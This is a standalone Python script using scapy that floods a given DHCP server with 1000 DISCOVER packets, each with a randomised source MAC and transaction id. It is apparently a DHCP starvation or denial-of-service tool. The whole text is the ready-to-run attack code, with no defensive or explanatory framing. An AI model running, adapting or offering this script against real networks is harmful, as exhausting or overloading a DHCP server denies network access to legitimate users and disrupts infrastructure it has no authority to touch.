from scapy.all import (
    Ether,
    IP,
    UDP,
    BOOTP,
    DHCP,
    sendp,
    get_if_list,
    get_if_hwaddr,
    get_if_addr,
)
from random import randint
from sys import argv
from randmac import RandMac


def main():
    IFACE = None

    # Parameters check
    if len(argv) < 3:
        print("Usage : %s net_iface server_ipv4" % argv[0])
        return 0

    if argv[1] not in get_if_list():
        print("Invalid network interface selected")
        return 1

    IFACE = argv[1]
    SERVER_IP = argv[2]

    # Retrieving necessary addresses

    self_mac = get_if_hwaddr(IFACE)
    self_ip = get_if_addr(IFACE)
    for i in range(1000):
        # Sending a request to get an IP address for our MAC address
        dhcp_discover_request = (
            Ether(src=RandMac(), dst="ff:ff:ff:ff:ff:ff")
            / IP(src=self_ip, dst=SERVER_IP)
            / UDP(dport=67, sport=68)
            / BOOTP(chaddr=self_mac, xid=randint(1, 4294967295))
            / DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(dhcp_discover_request)
    return 0


if __name__ == "__main__":
    exit(main())
